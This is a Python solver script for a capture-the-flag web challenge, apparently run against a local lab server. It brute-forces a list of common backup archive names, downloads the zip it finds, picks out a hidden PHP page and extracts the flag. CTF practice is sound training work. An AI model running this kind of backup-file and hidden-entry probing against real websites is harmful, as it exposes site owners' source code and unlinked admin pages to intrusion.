#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
import os
atexit.register(lambda: print("作者 ZluxYao"))
"""
12-brute-dir-backup 自动解题脚本
思路：爆破常见备份包 -> 下载 www.zip -> 分析压缩包中的隐藏入口 -> 访问入口提取 TOGOGO-flag{}
"""

import io
import re
import sys
import zipfile
from urllib.parse import urljoin
from urllib.request import Request, urlopen
from urllib.error import HTTPError, URLError

os.environ["NO_PROXY"] = "*"  # 防止代理污染：脚本只访问 127.0.0.1

BASE_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33267/")
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")

BACKUP_CANDIDATES = [
    "www.zip",
    "backup.zip",
    "bak.zip",
    "web.zip",
    "site.zip",
    "wwwroot.zip",
    "html.zip",
    "source.zip",
    "src.zip",
    "code.zip",
    "app.zip",
    "dist.zip",
    "public.zip",
    "htdocs.zip",
    "www.tar.gz",
    "backup.tar.gz",
]


def fetch(url: str, timeout: int = 10) -> tuple[int, bytes, dict]:
    """GET 请求，返回 (status, body, headers)。"""
    req = Request(url, headers={"User-Agent": "gkdctf-solver/1.0"})
    try:
        with urlopen(req, timeout=timeout) as resp:
            return resp.getcode(), resp.read(), dict(resp.headers)
    except HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except URLError as e:
        raise RuntimeError(f"请求失败: {url} -> {e}") from e


def find_backup() -> tuple[str, bytes]:
    """尝试常见备份文件名，找到可用 ZIP。"""
    print("[*] 开始探测常见备份文件...")
    for name in BACKUP_CANDIDATES:
        url = urljoin(BASE_URL, name)
        status, body, headers = fetch(url)
        ctype = headers.get("Content-Type", "")
        print(f"    {status:<3} {url} {ctype}")
        if status == 200 and (body.startswith(b"PK") or "zip" in ctype.lower()):
            print(f"[+] 命中备份包: {url}")
            return url, body
    raise RuntimeError("未找到可用备份包，可扩充 BACKUP_CANDIDATES 后重试")


def find_hidden_entry(zip_bytes: bytes) -> str:
    """从 ZIP 文件名和文本内容中寻找隐藏 PHP 入口。"""
    print("[*] 分析 ZIP 内容...")
    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:
        names = zf.namelist()
        for name in names:
            print(f"    - {name}")

        # 优先选非 index/config 的 php 文件，本题为 sup3r_s3cr3t_dashboard.php
        php_files = [n for n in names if n.lower().endswith(".php")]
        preferred = [n for n in php_files if "index" not in n.lower() and "config" not in n.lower()]
        if preferred:
            entry = preferred[0].lstrip("/")
            print(f"[+] 从文件名发现隐藏入口: {entry}")
            return entry

        # 如果没有明显 php 文件，就扫 README/文本中的 php 路径
        for name in names:
            lower = name.lower()
            if lower.endswith((".txt", ".md", ".html", ".php", ".conf")):
                try:
                    text = zf.read(name).decode("utf-8", errors="ignore")
                except Exception:
                    continue
                m = re.search(r"[A-Za-z0-9_./-]+\.php", text)
                if m:
                    entry = m.group(0).lstrip("/")
                    print(f"[+] 从 {name} 内容发现隐藏入口: {entry}")
                    return entry

    raise RuntimeError("ZIP 中未发现隐藏 PHP 入口")


def get_flag(entry: str) -> str:
    """访问隐藏入口并提取 flag。"""
    url = urljoin(BASE_URL, entry)
    print(f"[*] 访问隐藏入口: {url}")
    status, body, _ = fetch(url)
    text = body.decode("utf-8", errors="ignore")
    if status != 200:
        raise RuntimeError(f"隐藏入口访问失败，HTTP {status}")
    m = FLAG_RE.search(text)
    if not m:
        raise RuntimeError("页面中未提取到 TOGOGO-flag{}")
    return m.group(0)


def main() -> int:
    try:
        backup_url, zip_bytes = find_backup()
        entry = find_hidden_entry(zip_bytes)
        flag = get_flag(entry)
        print("\n[+] 解题成功")
        print(f"    backup: {backup_url}")
        print(f"    entry : {urljoin(BASE_URL, entry)}")
        print(f"    flag  : {flag}")
        return 0
    except Exception as e:
        print(f"[-] 失败: {e}", file=sys.stderr)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
